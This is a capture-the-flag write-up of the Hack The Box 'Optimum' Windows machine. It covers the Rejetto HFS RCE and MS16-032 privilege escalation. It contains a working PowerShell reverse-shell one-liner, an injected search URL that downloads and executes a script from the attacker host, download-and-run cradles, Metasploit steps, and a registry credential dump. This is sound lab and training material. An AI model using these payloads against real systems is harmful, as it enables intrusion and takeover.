[Done](Done)
## 📌 Box Info
- **OS**: [Windows](Windows)
- **Difficulty**: [Easy](Easy)
- Platform: [HTB](HTB)
- Prep: [OSCP](OSCP)
- **Exploits Used**:
  - **RCE**: [CVE-2014-6287](https://nvd.nist.gov/vuln/detail/CVE-2014-6287) – Rejetto HFS 2.3.x
  - **PrivEsc**: [CVE-2016-0099](https://nvd.nist.gov/vuln/detail/CVE-2016-0099) – MS16-032

---

## 🧭 Recon

### 🔍 Full TCP Scan
```bash
nmap -p- --min-rate 10000 10.10.10.8
```

### 🎯 Service Detection
```bash
nmap -p 80 -sCV 10.10.10.8
```

**Result:**
- Port `80` open
- Service: `HttpFileServer 2.3`

---

## 🌐 [Web Recon – HFS](HTTP)

### 🕵️ Vulnerability Check
```bash
searchsploit httpfileserver
```

**Finding:**  
`Rejetto HttpFileServer 2.3.x - Remote Command Execution` → [CVE-2014-6287](https://www.exploit-db.com/exploits/49125)

---

## 🧨 Initial Access – kostas

### 🔧 Exploit Trigger (PowerShell Reverse Shell)
**Prep Nishang One-liner:**
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.13',666);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Start server:
```bash
python3 -m http.server 80
```

### 🛰️ Netcat Listener
```bash
rlwrap nc -lnvp 443
```

Trigger via encoded URL:
```http
http://10.10.10.8/?search=%00{.exec|C%3a\Windows\System32\WindowsPowerShell\v1.0\powershell.exe+IEX(New-Object+Net.WebClient).downloadString('http%3a//10.10.14.13/rev.ps1').}
```

**Shell Received:**
```powershell
whoami
optimum\kostas
```

### 🏁 User Flag
```powershell
type C:\Users\kostas\Desktop\user.txt.txt
```

---

## 🧱 Privilege Escalation – SYSTEM

### 🧬 Confirm Architecture
```powershell
[Environment]::Is64BitProcess
True
```

### 🪪 Credential Reuse
```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```
> Found: `kostas : kdeEjDowkS*` (but already logged in as kostas)

---

### 🔍 Kernel Exploit Enumeration – Sherlock
**Upload & execute:**
```powershell
IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.13/Sherlock.ps1')
Find-AllVulns
```

**Findings:**
- MS16-032 → CVE-2016-0099 – ✅ Vulnerable
- MS16-034 / MS16-135 → also show as potentially vulnerable

---

### 🧬 Exploit MS16-032 Metasploit

### Metasploit

```
msfconsole -q
```

```
search windows/http/rejetto_hfs_exec
use 0

show options

set LHOST tun0
set RHOSTS 10.10.10.8
set LPORT 9999
set RPORT 80
```

```
background
sessions -i

```

```
search suggester
use 0
set session 1  
run

```

```
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc

set LHOST tun0
set LPORT 6663
set session 1
exploit
```

# ROOTED with Metasploit




### 🧬 Exploit MS16-032

**Exploit Script Used:**
[`Invoke-MS16032.ps1`](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1)

Append to script:
```powershell
Invoke-MS16032 -Command "iex(New-Object Net.WebClient).DownloadString('http://10.10.14.10/rev.ps1')"
```

**Run from PowerShell:**
```powershell
IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.10/Invoke-MS16032.ps1')
```

### ⚡ SYSTEM Shell
```powershell
whoami
nt authority\system
```

### 🏁 Root Flag
```powershell
type C:\Users\Administrator\Desktop\root.txt
```

---

## 🧠 Lessons Learned

### 🪞 Initial Access
- HFS 2.3.x is vulnerable to RCE via `/?search=%00{.exec|...}`
- Using PowerShell cradles with `downloadString` is an effective and fast method to gain shells on legacy boxes.

### 🔓 PrivEsc Takeaways
- Kernel exploits like **MS16-032** remain valid for unpatched boxes.
- Use **Sherlock** or **Watson** (older machines might not support Watson’s .NET dependencies).
- Watch out for **process architecture** (32-bit shells won’t work for 64-bit kernel exploits).
